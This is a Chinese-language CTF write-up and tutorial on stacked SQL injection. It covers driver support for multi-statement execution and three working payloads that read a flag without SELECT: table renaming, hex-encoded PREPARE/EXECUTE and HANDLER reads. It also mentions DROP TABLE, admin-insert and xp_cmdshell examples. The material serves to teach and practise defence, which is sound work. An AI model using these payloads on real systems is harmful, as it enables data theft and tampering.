# 📚 堆叠注入底层边界与强网杯“无 SELECT”三大神级解法

> **核心价值**：常规注入（联合查询、报错、盲注）本质上都受限于**同一条 SQL 语句内部的上下文**。
> 而**堆叠注入（Stacked Queries）**通过分号 `;` 强行终结当前语句，并直接追加并执行**第二条、第三条甚至完全独立的任意 SQL 指令**（如 `INSERT`、`UPDATE`、`DROP`、`ALTER`、甚至修改表名与配置）。

---

## 0. 基础前置认知与小白扫盲：什么是堆叠注入？

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


### 1. 分号 `;` 的化学反应：从一条查询到任意指令
* 在 SQL 语法规范中，**分号 `;` 代表一条完整 SQL 语句的终结**。
* **堆叠注入（Stacked Queries）的本质**：黑客在一个输入参数中，利用分号 `;` 强行画下句号，然后在分号后面另起炉灶，**直接写下一条全新的增删改指令**（例如 `; INSERT INTO admin VALUES ('hacker','pass');` 或 `; DROP TABLE logs;`）！
* **为什么不是所有数据库都支持？**
  * 这不是数据库本身支不支持的问题，而是**中间的驱动连接器（API）支不支持一次性执行多条语句**！
  * 在 PHP + MySQL 环境中，经典的 `mysqli_query()` 默认禁止执行多语句，因此堆叠注入往往无法生效；
  * 但在 Java + JDBC、Python + psycopg2 或微软的 MSSQL / PostgreSQL 环境中，多语句执行往往被默认允许，堆叠注入成为可以直接增删改甚至直接调用系统存储过程（`xp_cmdshell`）的核弹级漏洞！

## 一、底层驱动与多数据库支持矩阵

堆叠注入并非数据库不支持，而是受限于**应用程序连接数据库的客户端驱动接口（API Driver）**！

| 数据库环境 | 典型编程语言与驱动接口 | 是否支持堆叠注入 | 底层原因与安全限制 |
| :--- | :--- | :--- | :--- |
| **MySQL** | PHP: `mysqli_query()` / `mysql_query()` | ❌ **不支持** | 底层驱动只向数据库发送首条查询，遇到分号直接抛出语法错误。 |
| **MySQL** | PHP: `mysqli_multi_query()` / `PDO` | ✅ **完美支持** | PDO 默认开启多语句执行（`PDO::MYSQL_ATTR_MULTI_STATEMENTS` 为 true）。 |
| **MySQL** | Java: JDBC (`Connector/J`) | ⚠️ **需配置** | 默认禁用；需在连接 URL 中显式指定 `allowMultiQueries=true`。 |
| **MSSQL (SQL Server)** | ASP / .NET / PHP (`sqlsrv`) | ✅ **默认完全支持** | 危害极大！可直接堆叠执行 `EXEC master..xp_cmdshell 'whoami'` 拿服务器权限。 |
| **PostgreSQL** | PHP: `pg_query()` / Python: `psycopg2` | ✅ **大部分支持** | 支持执行多条分号隔离语句。 |
| **Oracle** | 原生驱动 | ❌ **不支持普通堆叠** | 需包裹在 `BEGIN ... END;` PL/SQL 代码块中才能执行多语句。 |

## 二、经典实战大题：强网杯“随便注”全盘复现

### 1. 题目背景与源码过滤规则
在强网杯“随便注”中，后端过滤了几乎所有的关键 DML 词汇：
```php
// 极度苛刻的黑名单过滤（不区分大小写）
if(preg_match("/select|update|delete|drop|insert|where|\./i", $inject)) {
    die("return Error - Filtered!");
}
```
* **现状分析**：`SELECT` 被彻底封杀，导致联合查询、报错注入、盲注全部失效！
* **突破口**：代码使用的是 `multi_query()`，且分号 `;`、`show`、`alter`、`set`、`prepare`、`handler` 均未被过滤！

---

### 2. 信息收集阶段：利用 SHOW 语句跨库侦察

#### 步骤 1：查看当前库所有数据表
```sql
?inject=1'; SHOW TABLES; --+
```
> **回显结果**：
> `1919810931114514`
> `words`

#### 步骤 2：查看敏感表字段结构
> [!IMPORTANT]
> **参数细节：为什么表名必须加反引号 `` ` ``？**
> 在 SQL 规范中，**以纯数字命名的表或列（如 `1919810931114514`）会被数据库词法解析器优先识别为整数常量**，直接执行 `SHOW COLUMNS FROM 1919810931114514;` 会触发致命语法错误！
> 必须使用反引号包裹：`` `1919810931114514` ``，强制通知 MySQL 将其作为合法的标识符（Identifier）解析！

```sql
?inject=1'; SHOW COLUMNS FROM `1919810931114514`; --+
```
> **回显字段**：`flag`

```sql
?inject=1'; SHOW COLUMNS FROM `words`; --+
```
> **回显字段**：`id`, `data`
> **逻辑逆向**：页面默认的查询逻辑必然是 `SELECT * FROM words WHERE id = '$inject'`。Flag 藏在纯数字表中，但我们无法使用 `SELECT` 查询它！

### 3. “无 SELECT 读数据”三大神级解法

---

#### 🌟 神级解法一：修改表名结构劫持法（ALTER + RENAME）

#### 核心思想：
既然原代码会自动执行 `SELECT * FROM words WHERE id = ...` 并把结果打印到屏幕上，那我们**直接把数据库表结构偷梁换柱**：
1. 把原本的 `words` 表改名为随便一个备份名字 `words_bak`；
2. 把藏有 Flag 的 `1919810931114514` 表改名为 `words`；
3. 将新 `words` 表中的 `flag` 字段名强行修改为 `id`！
4. 随后我们发送普通的 `?inject=1' OR 1=1 --+`，后端就会乖乖替我们把 Flag 作为 `id` 打印在屏幕上！

#### 🔍 注入 Payload 与全参数逐行拆解：
```sql
?inject=1'; 
RENAME TABLE `words` TO `words_bak`; 
RENAME TABLE `1919810931114514` TO `words`; 
ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100); 
--+
```

| 语句片段 | 语法作用与参数拆解 | 底层执行效果 |
| :--- | :--- | :--- |
| `RENAME TABLE words TO words_bak;` | 将合法表 `words` 腾出位置。 | 避开表名命名冲突。 |
| `RENAME TABLE `1919810931114514` TO words;` | 将纯数字表升格为系统默认查询表。 | 原代码后续所有查询直接命中此表。 |
| `ALTER TABLE words CHANGE flag id VARCHAR(100);` | **字段重命名语法**：<br>`CHANGE 旧列名 新列名 新列类型`。 | 将 `flag` 列重命名为 `id`，使原代码能够通过 `$row['id']` 正确提取并回显数据。 |

* **触发回显**：执行完上述语句后，传入 `?inject=1' OR 1=1 --+`，页面直接打印出完整的 **Flag**！

---

#### 🌟 神级解法二：预处理动态编译绕过（PREPARE + EXECUTE）

#### 核心思想：
`SELECT` 关键字只是在传输给 PHP 时被正则过滤。如果我们将 `select * from `1919810931114514`` 编码为**十六进制字符串**，传入 MySQL 后再动态编译为 SQL 语句执行，即可完美绕过应用层正则！

#### 🔍 注入 Payload 与全参数拆解：
```sql
?inject=1'; 
SET @stmt_sql = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460; 
PREPARE stmt FROM @stmt_sql; 
EXECUTE stmt; 
--+
```

| 语句片段 | 语法作用与参数拆解 | 深入底层原理 |
| :--- | :--- | :--- |
| `SET @stmt_sql = 0x73656c...;` | 定义 MySQL 用户级会话变量 `@stmt_sql`。值是待执行 SQL 的十六进制 ASCII 串。 | 变量内容全为十六进制字符，Payload 中没有出现哪怕一个 `select` 敏感字符！ |
| `PREPARE stmt FROM @stmt_sql;` | **预处理声明语句**。指示数据库将字符串解析编译为一条可执行的预备语句模板 `stmt`。 | 此时语句才在 MySQL 内部被解构为指令。 |
| `EXECUTE stmt;` | **执行预处理语句**。运行已编译的指令模板。 | 在当前堆叠会话中执行查询并返回数据。 |

---

#### 🌟 神级解法三：MySQL 原生游标读表命令（HANDLER 语句）

#### 核心思想：
很多人以为 MySQL 只有 `SELECT` 才能读表。其实 MySQL 从 4.0.3 起就内置了一个底层的原生接口——**`HANDLER`（表处理器）**！
`HANDLER` 绕过了 SQL 解析优化器，直接以类似文件游标的方式一行一行遍历表记录。**整个流程完全不需要 `SELECT` 和 `WHERE` 关键字！**

#### 🔍 注入 Payload 与全参数拆解：
```sql
?inject=1'; 
HANDLER `1919810931114514` OPEN AS hd; 
HANDLER hd READ FIRST; 
HANDLER hd CLOSE; 
--+
```

| 关键字 / 参数 | 语法作用 | 优势与底层机制 |
| :--- | :--- | :--- |
| `HANDLER 表名 OPEN AS 别名;` | 打开指定表的底层存储引擎游标，赋予句柄别名（如 `hd`）。 | 建立针对该表的读取上下文。 |
| `HANDLER hd READ FIRST;` | **直接读取第一行记录**并回显全部字段内容！<br>若需要读下一行，可执行 `READ NEXT`。 | **终极免杀**：没有任何黑名单能预料到攻击者会使用存储引擎级指令！ |
| `HANDLER hd CLOSE;` | 关闭游标句柄，释放系统资源。 | 规范闭环。 |
